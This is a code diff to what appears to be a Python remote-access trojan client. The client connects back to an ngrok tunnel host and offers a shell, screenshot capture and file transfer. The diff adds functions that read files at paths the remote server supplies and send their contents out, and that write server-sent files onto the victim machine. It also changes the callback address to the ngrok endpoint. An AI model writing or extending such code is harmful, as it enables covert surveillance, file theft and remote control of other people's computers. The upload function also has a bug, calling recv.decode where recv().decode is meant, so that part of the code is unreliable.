@@ -7,7 +7,7 @@ import mss
 
 
 
-address = ("0.0.0.0", 3000)
+address = ("2.tcp.ngrok.io", 18169)
 
 def take_screen_shot():
     if len(mss.mss().monitors) > 0:
@@ -16,6 +16,29 @@ def take_screen_shot():
         send(img_data)
 
         del(raw_pixels, img_data)
+        
+def upload_file():
+    file_path = recv.decode()
+    
+    try:
+        file = open(file_path, "rb")
+        send(file_path.encode())
+        
+        file_data = file.read()
+        send(file_data)
+    except:
+        print("error ocurred")
+        
+        
+def download_file():
+    file_path = recv().decode()
+    file_path = file_path.split("/")
+
+
+    file_data = recv()    
+    with open(file_path.pop(), "wb") as file:
+        file.write(file_data)
+    
 
 def recv():
     data_size = int(server_con.recv(12).decode())
@@ -83,7 +106,9 @@ def main():
             open_shell()
         elif choice == "2":
             take_screen_shot()
-        elif choice == "6":
+        elif choice == "4":
+            download_file()
+        elif choice == "5":
             server_con.close()
             time.sleep(5)
             establish_connection(address)
